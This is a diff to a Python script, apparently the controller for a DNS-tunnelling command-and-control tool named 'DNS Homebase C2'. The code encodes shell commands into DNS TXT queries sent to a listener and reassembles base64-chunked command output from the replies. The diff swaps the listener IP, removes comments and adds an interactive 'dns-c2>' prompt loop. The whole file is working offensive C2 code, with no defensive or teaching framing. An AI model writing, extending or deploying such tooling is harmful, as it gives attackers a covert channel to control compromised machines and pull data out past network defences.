@@ -3,7 +3,7 @@ import base64
 from dnslib import DNSRecord
 import time
 
-DNS_SERVER = "192.168.10.25"  # Update with your listener's IP
+DNS_SERVER = "192.168.10.26"  # Replace with your listener's IP
 DNS_PORT = 5300
 DOMAIN = "dom.com"
 
@@ -12,7 +12,6 @@ def send_command(cmd):
     labels = [encoded_cmd[i:i+50] for i in range(0, len(encoded_cmd), 50)]
     query_name = ".".join(labels) + f".{DOMAIN}"
 
-    # Send initial command
     q = DNSRecord.question(query_name, qtype="TXT")
     response = q.send(DNS_SERVER, DNS_PORT, timeout=3)
     reply = DNSRecord.parse(response)
@@ -32,7 +31,6 @@ def send_command(cmd):
             print(f"[!] Failed to parse first chunk: {e}")
             return
 
-        # Fetch remaining chunks
         for i in range(1, total_parts):
             try:
                 time.sleep(0.5)
@@ -52,7 +50,6 @@ def send_command(cmd):
             except Exception as e:
                 print(f"[!] Failed to get chunk {i}: {e}")
 
-        # Reassemble and decode
         try:
             ordered = "".join(chunks[i] for i in sorted(chunks.keys()))
             decoded = base64.b64decode(ordered.encode()).decode()
@@ -63,5 +60,14 @@ def send_command(cmd):
         print(f"\n[+] Output:\n{first_txt}")
 
 if __name__ == "__main__":
-    cmd = input("Enter command to send: ")
-    send_command(cmd)
+    print("[+] DNS Homebase C2 — Interactive Mode")
+    try:
+        while True:
+            cmd = input("dns-c2> ").strip()
+            if cmd.lower() in ("exit", "quit"):
+                print("[-] Exiting...")
+                break
+            elif cmd:
+                send_command(cmd)
+    except KeyboardInterrupt:
+        print("\n[-] Session ended by user.")
